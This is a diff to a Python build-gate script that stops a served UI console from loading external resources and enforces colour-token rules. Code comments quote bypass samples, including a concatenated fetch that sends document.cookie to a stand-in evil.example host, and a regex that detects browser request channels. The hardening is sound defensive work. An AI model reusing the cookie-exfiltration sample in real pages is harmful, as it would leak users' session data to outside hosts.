@@ -417,6 +417,23 @@ BASE_SELECTOR = ":root"
 DARK_SELECTORS = (':root:not([data-theme="light"])', ':root[data-theme="dark"]')
 LIGHT_SELECTOR = ':root[data-theme="light"]'
 
+# The ONLY selectors allowed to declare --mg-* tokens. Anything else fails the
+# build, and that is the fix for a real bypass: this gate keys blocks by
+# selector text and has no model of the CSS cascade, so a rule the browser
+# honours but the gate does not recognise is a colour that renders having
+# never been measured. Both of these passed clean before the rule existed:
+#
+#   html:root[data-theme="dark"] { --mg-ink-faint: #14181B; }
+#       — specificity (0,2,1) beats the checked (0,2,0) and wins outright
+#   [data-theme="dark"]:root     { --mg-ink-faint: #14181B; }
+#       — identical specificity, later in source order, so it also wins
+#
+# Recognising selectors is a losing game (there are unbounded ways to write
+# an equivalent one). Refusing to accept any selector but the four canonical
+# forms is not: an author who genuinely needs a fifth changes this tuple
+# deliberately and says why, which is exactly the review we want.
+CANONICAL_SELECTORS = (BASE_SELECTOR, *DARK_SELECTORS, LIGHT_SELECTOR)
+
 
 def parse_css_tokens(text: str) -> dict[str, dict[str, str]]:
     """Return {selector: {token: value}} for every block that declares --mg-*.
@@ -445,6 +462,18 @@ def check_theme_blocks_in_sync(f: Findings) -> None:
         return
 
     blocks = parse_css_tokens(path.read_text(encoding="utf-8"))
+
+    # Fail closed on any selector this gate does not model. See the comment on
+    # CANONICAL_SELECTORS — an unrecognised selector is not an oddity, it is a
+    # colour that renders without ever being measured.
+    for selector in sorted(set(blocks) - set(CANONICAL_SELECTORS)):
+        f.fail("THEME-SYNC", path, None,
+               f"'{selector}' declares --mg-* tokens, and this gate only models "
+               f"{', '.join(CANONICAL_SELECTORS)}. It has no model of the CSS cascade, so "
+               f"a selector it does not recognise can win in the browser while never being "
+               f"measured here. Move the tokens into a canonical block, or add this form to "
+               f"CANONICAL_SELECTORS deliberately.")
+
     base = blocks.get(BASE_SELECTOR)
     if not base:
         f.fail("THEME-SYNC", path, None,
@@ -546,6 +575,13 @@ def load_validator():
     """
     import importlib.util
 
+    # Everything check_palette() actually calls. Verified rather than assumed:
+    # this function executes a file out of the tree under test, and a module
+    # that imports fine but lacks one of these would take the gate down with
+    # an AttributeError halfway through a run — which reads as "the gate is
+    # broken" rather than "your palette is wrong".
+    required = ("contrast", "validate")
+
     for base in (REPO / "ui", Path(__file__).resolve().parent.parent / "ui"):
         candidate = base / "validate_palette.py"
         if not candidate.is_file():
@@ -554,8 +590,12 @@ def load_validator():
         if spec is None or spec.loader is None:
             continue
         module = importlib.util.module_from_spec(spec)
-        spec.loader.exec_module(module)
-        return module
+        try:
+            spec.loader.exec_module(module)
+        except Exception:  # noqa: BLE001 - any import-time failure, keep looking
+            continue
+        if all(hasattr(module, name) for name in required):
+            return module
     return None
 
 
@@ -710,8 +750,29 @@ URL_ALLOWLIST = (
     "http://www.w3.org/1999/xhtml",
 )
 
-EXTERNAL_URL_RE = re.compile(r"https?://[^\s\"'()<>]+")
-PROTOCOL_RELATIVE_RE = re.compile(r"""(?:src|href)\s*=\s*["']//""", re.I)
+# Scanned against the WHOLE file, not line by line. An HTML attribute value
+# may contain a literal newline, so `<img src="https://\nevil.example/x.png">`
+# split the scheme from the host across two lines and passed a per-line scan
+# clean. \s* inside the pattern lets the match span that break.
+EXTERNAL_URL_RE = re.compile(r"https?:\s*//\s*[^\s\"'()<>]+")
+PROTOCOL_RELATIVE_RE = re.compile(r"""(?:src|href)\s*=\s*["']\s*//""", re.I)
+
+# Every fetch() in shipped UI must name a same-origin absolute path as a
+# plain string literal. This is the structural answer to the one thing a text
+# scan genuinely cannot see:
+#
+#     fetch("ht" + "tps://evil.example/x?" + document.cookie)
+#
+# There is no regex that recognises a URL after the author has split it, and
+# pretending otherwise would be exactly the overclaim this project keeps
+# refusing to make. So the rule stops trying to recognise bad URLs and instead
+# requires the good shape: a literal beginning with "/". A concatenation, a
+# template literal, a variable or a new URL() is then a violation on its face,
+# whatever it evaluates to.
+FETCH_CALL_RE = re.compile(r"\bfetch\s*\(\s*([^,)]*)")
+FETCH_LITERAL_RE = re.compile(r"""^["']/[^"']*["']$""")
+DYNAMIC_REQUEST_RE = re.compile(
+    r"\b(?:XMLHttpRequest|importScripts|navigator\s*\.\s*sendBeacon|EventSource|WebSocket)\b")
 # Exactly the lengths CSS accepts for a hex colour, so ids like #chart-x and
 # entities like &#39; are not mistaken for one.
 HEX_LITERAL_RE = re.compile(r"#(?:[0-9a-fA-F]{8}|[0-9a-fA-F]{6}|[0-9a-fA-F]{4}|[0-9a-fA-F]{3})\b")
@@ -737,51 +798,123 @@ def blank_block_comments(text: str) -> str:
     return BLOCK_COMMENT_RE.sub(lambda m: re.sub(r"[^\n]", " ", m.group(0)), text)
 
 
-def ui_files() -> list[Path]:
+# Browser-facing text formats this rule knows how to read.
+SCANNED_SUFFIXES = {".html", ".htm", ".css", ".js", ".mjs", ".svg", ".json", ".webmanifest"}
+# Tooling and documentation that lives beside the UI but is never served.
+NOT_SERVED_SUFFIXES = {".py", ".md"}
+
+
+def ui_files() -> tuple[list[Path], list[Path]]:
+    """Return (files to scan, files with no scanner) under ui/.
+
+    .svg is in the scanned set, and its omission was a real hole: an SVG is
+    not an image, it is a document. It can carry <image href="https://...">, a
+    <style> block, its own <script>, and raw fill="#8B9AA0" attributes that
+    the PALETTE checks never see. Pulling one in with <link rel="icon"> was a
+    clean bypass of both halves of this rule.
+
+    Anything a browser can fetch but this gate cannot read comes back as
+    unscannable and FAILS, rather than being quietly skipped — the same
+    fail-closed posture the LICENCE rule takes on a dependency manifest it has
+    no scanner for. Otherwise this rule is only ever as strong as the list of
+    file extensions somebody happened to think of.
+    """
     ui = REPO / UI_DIR
     if not ui.is_dir():
-        return []
-    return sorted(p for p in ui.rglob("*")
-                  if p.is_file() and p.suffix.lower() in {".html", ".htm", ".css", ".js"})
+        return [], []
+    scan: list[Path] = []
+    unknown: list[Path] = []
+    for path in sorted(ui.rglob("*")):
+        if not path.is_file():
+            continue
+        # Derived directories are build output, never shipped, and are
+        # gitignored. Without this, fail-closed correctly but uselessly
+        # flags __pycache__ the moment anyone runs the tests.
+        if {"__pycache__", "node_modules", ".git"} & set(path.parts):
+            continue
+        suffix = path.suffix.lower()
+        if suffix in SCANNED_SUFFIXES:
+            scan.append(path)
+        elif suffix not in NOT_SERVED_SUFFIXES:
+            unknown.append(path)
+    return scan, unknown
+
+
+def _line_of(source: str, offset: int) -> int:
+    return source.count("\n", 0, offset) + 1
 
 
 def check_ui_self_contained(f: Findings) -> None:
-    files = ui_files()
+    files, unscannable = ui_files()
+
+    for path in unscannable:
+        f.fail("UI-SELF-CONTAINED", path, None,
+               f"a browser can fetch this from {UI_DIR}/ but this rule has no scanner for "
+               f"'{path.suffix or path.name}'. Assets are entering the shipped console "
+               f"unchecked. Add the extension to SCANNED_SUFFIXES (and make sure the "
+               f"checks below make sense for it) or to NOT_SERVED_SUFFIXES if it is never "
+               f"served.")
+
     if not files:
-        f.note("no ui/ files yet — UI-SELF-CONTAINED not exercised")
+        if not unscannable:
+            f.note("no ui/ files yet — UI-SELF-CONTAINED not exercised")
         return
 
-    checked = 0
     for path in files:
-        rel = path.relative_to(REPO).as_posix()
         is_tokens = path.name == TOKENS_BASENAME
-        checked += 1
+        # Scanned as ONE string rather than line by line. An HTML attribute
+        # value may contain a literal newline, and splitting a URL across one
+        # defeated the per-line scan completely.
         source = blank_block_comments(path.read_text(encoding="utf-8", errors="replace"))
-        for n, line in enumerate(source.splitlines(), start=1):
-            for match in EXTERNAL_URL_RE.finditer(line):
-                url = match.group(0)
-                if any(url.startswith(allowed) for allowed in URL_ALLOWLIST):
-                    continue
-                f.fail("UI-SELF-CONTAINED", path, n,
-                       f"references {url}. The shield console is served from the edge "
-                       f"node and must load nothing from the internet — an operator "
-                       f"opens it when things are already going wrong.")
-            if PROTOCOL_RELATIVE_RE.search(line):
-                f.fail("UI-SELF-CONTAINED", path, n,
-                       "protocol-relative URL. Same rule: no external resources.")
 
-            # tokens.css is where colours are allowed to be literal; that is
-            # the whole point of it, and the PALETTE rule reads it there.
-            if is_tokens:
+        for match in EXTERNAL_URL_RE.finditer(source):
+            url = " ".join(match.group(0).split())
+            if any(url.startswith(allowed) for allowed in URL_ALLOWLIST):
                 continue
-            code = line.split("//", 1)[0]
-            if HEX_LITERAL_RE.search(code) or COLOUR_FN_RE.search(code):
-                f.fail("UI-SELF-CONTAINED", path, n,
-                       f"colour literal outside {UI_DIR}/{TOKENS_BASENAME}. Use a "
-                       f"--mg-* token: literals here are invisible to the PALETTE "
-                       f"contrast and colour-vision checks.")
+            f.fail("UI-SELF-CONTAINED", path, _line_of(source, match.start()),
+                   f"references {url}. The shield console is served from the edge node "
+                   f"and must load nothing from the internet — an operator opens it when "
+                   f"things are already going wrong.")
 
-    f.note(f"{checked} ui/ file(s) checked for external requests and colour literals")
+        for match in PROTOCOL_RELATIVE_RE.finditer(source):
+            f.fail("UI-SELF-CONTAINED", path, _line_of(source, match.start()),
+                   "protocol-relative URL. Same rule: no external resources.")
+
+        for match in DYNAMIC_REQUEST_RE.finditer(source):
+            f.fail("UI-SELF-CONTAINED", path, _line_of(source, match.start()),
+                   f"{match.group(0)} opens a request channel this rule cannot follow. "
+                   f"The console fetches same-origin paths and nothing else.")
+
+        # Require the good shape rather than trying to recognise the bad one.
+        for match in FETCH_CALL_RE.finditer(source):
+            target = match.group(1).strip()
+            if not FETCH_LITERAL_RE.match(target):
+                f.fail("UI-SELF-CONTAINED", path, _line_of(source, match.start()),
+                       f"fetch({target or '…'}…) does not name a same-origin path as a "
+                       f"plain string literal starting with '/'. A concatenation, template "
+                       f"literal or variable is a URL this gate cannot read — and "
+                       f'fetch("ht" + "tps://…") is exactly how a text scan gets walked '
+                       f"past.")
+
+        # tokens.css is where colours are allowed to be literal; that is the
+        # whole point of it, and the PALETTE rule reads them there.
+        if is_tokens:
+            continue
+        for pattern in (HEX_LITERAL_RE, COLOUR_FN_RE):
+            for match in pattern.finditer(source):
+                line_no = _line_of(source, match.start())
+                line = source.splitlines()[line_no - 1] if line_no <= source.count("\n") + 1 else ""
+                # A // line comment still suppresses the colour check only.
+                marker = line.find("//")
+                if marker != -1 and match.start() > source.rfind("\n", 0, match.start()) + marker:
+                    continue
+                f.fail("UI-SELF-CONTAINED", path, line_no,
+                       f"colour literal {match.group(0)!r} outside {UI_DIR}/"
+                       f"{TOKENS_BASENAME}. Use a --mg-* token: literals here are "
+                       f"invisible to the PALETTE contrast and colour-vision checks.")
+
+    f.note(f"{len(files)} ui/ file(s) scanned for external requests, request channels "
+           f"and colour literals")
 
 
 # ---------------------------------------------------------------------------
